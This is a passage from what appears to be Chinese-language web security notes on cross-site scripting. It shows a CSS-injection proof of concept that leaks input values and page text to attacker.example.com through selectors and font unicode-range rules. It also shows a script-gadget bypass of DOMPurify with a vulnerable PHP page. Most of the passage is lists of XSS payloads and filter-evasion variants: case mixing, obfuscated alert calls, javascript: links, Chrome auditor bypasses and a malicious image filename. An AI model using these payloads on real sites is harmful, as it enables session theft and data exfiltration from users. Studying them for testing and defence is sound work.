punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;c&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    [...]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://example.com&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;form2&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;secret&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;secret&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;abc&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;上图是利用 CSS selectors 完成攻击的一个示例&lt;/p&gt;
&lt;h3 id=&#34;abusing-unicode-range&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#abusing-unicode-range&#34;&gt;#&lt;/a&gt; Abusing Unicode Range&lt;/h3&gt;
&lt;p&gt;当可以插入 CSS 的时候，可以使用  &lt;code&gt;font-face&lt;/code&gt;  配合  &lt;code&gt;unicode-range&lt;/code&gt;  获取目标网页对应字符集。PoC 如下&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* fetched */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0041&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?B&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* fetched too */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0042&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?C&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* not fetched */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0043&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token selector&#34;&gt;#sensitive-information&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;sensitive-information&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;AB&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当字符较多时，则可以结合  &lt;code&gt;::first-line&lt;/code&gt;  等 CSS 属性缩小范围，以获取更精确的内容&lt;/p&gt;
&lt;h2 id=&#34;bypass-via-script-gadgets&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass-via-script-gadgets&#34;&gt;#&lt;/a&gt; Bypass Via Script Gadgets&lt;/h2&gt;
&lt;h3 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为  &lt;code&gt;Code Reuse&lt;/code&gt;  的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文  &lt;code&gt;Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets&lt;/code&gt;  中有该方法的具体描述。&lt;/p&gt;
&lt;p&gt;portswigger 的一篇博文也表达了类似的想法  &lt;code&gt;https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;下面有一个简单的例子，这个例子使用了  &lt;code&gt;DOMPurify&lt;/code&gt;  来加固，但是因为引入了  &lt;code&gt;jquery.mobile.js&lt;/code&gt;  导致可以被攻击。&lt;/p&gt;
&lt;h3 id=&#34;例子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#例子&#34;&gt;#&lt;/a&gt; 例子&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;// index.php
&amp;lt;?php

$msg = $_GET[&#39;message&#39;];
$msg = str_replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;, $msg);
$msg = base64_encode($msg);

?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Preview&amp;lt;/title&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;purify.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;jquery.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;jquery.mobile.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
    var d= atob(&#39;&amp;lt;?php echo $msg; ?&amp;gt;&#39;);
    var cleanvar = DOMPurify.sanitize(d);
    document.write(cleanvar);
    &amp;lt;/script&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
// payload
&amp;lt;div data-role=popup id=&#39;--&amp;gt;
&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;&#39;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;rporelative-path-overwrite&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rporelative-path-overwrite&#34;&gt;#&lt;/a&gt; RPO(Relative Path Overwrite)&lt;/h2&gt;
&lt;p&gt;RPO (Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。&lt;/p&gt;
&lt;h1 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; Payload&lt;/h1&gt;
&lt;h2 id=&#34;常用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用&#34;&gt;#&lt;/a&gt; 常用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svg onload=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=document.domain onerror=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;M onmouseover=alert(document.domain)&amp;gt;M&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;marquee onscroll=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:alert(document.domain)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;body onload=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;details open ontoggle=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;embed src=javascript:alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(1)&amp;lt;/ScRiPt&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/ScRiPt&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iMg src=1 oNeRrOr=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ImG src=1 OnErRoR=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(&amp;quot;M&amp;quot;)&amp;quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;marquee onscroll=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;mArQuEe OnScRoLl=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;MaRqUeE oNsCrOlL=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;各种alert&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#各种alert&#34;&gt;#&lt;/a&gt; 各种 alert&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;confirm(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;1&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;1&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert&lt;/code&gt; 1 &lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;(alert)(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;a=alert,a(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;[1].find(alert)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[&amp;quot;al&amp;quot;+&amp;quot;ert&amp;quot;](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[&amp;quot;a&amp;quot;+&amp;quot;l&amp;quot;+&amp;quot;e&amp;quot;+&amp;quot;r&amp;quot;+&amp;quot;t&amp;quot;](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[/al/.source+/ert/.source](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪协议&#34;&gt;#&lt;/a&gt; 伪协议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/0/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/00/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/000/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/M/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chrome-xss-auditor-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chrome-xss-auditor-bypass&#34;&gt;#&lt;/a&gt; Chrome XSS auditor bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;?param=https://&amp;amp;param=@z.exeye.io/import%20rel=import%3E&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;base href=javascript:/M/&amp;gt;&amp;lt;a href=,alert(1)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;base href=javascript:/M/&amp;gt;&amp;lt;iframe src=,alert(1)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;长度限制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度限制&#34;&gt;#&lt;/a&gt; 长度限制&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;s+=&amp;quot;l&amp;quot;&amp;lt;/script&amp;gt;
\...
&amp;lt;script&amp;gt;eval(s)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;jquery-sourcemappingurl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jquery-sourcemappingurl&#34;&gt;#&lt;/a&gt; jquery sourceMappingURL&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;var a=1//@ sourceMappingURL=//xss.site&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;图片名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图片名&#34;&gt;#&lt;/a&gt; 图片名&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.cookie)&amp;gt;.gif
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;过期的payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过期的payload&#34;&gt;#&lt;/a&gt; 过期的 payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;src=javascript:alert 基本不可以用&lt;/li&gt;
&lt;li&gt;css expression 特性只在旧版本 ie 可用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css&#34;&gt;#&lt;/a&gt; css&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&amp;quot;background-image:url(javascript:alert(/xss/))&amp;quot;&amp;gt;
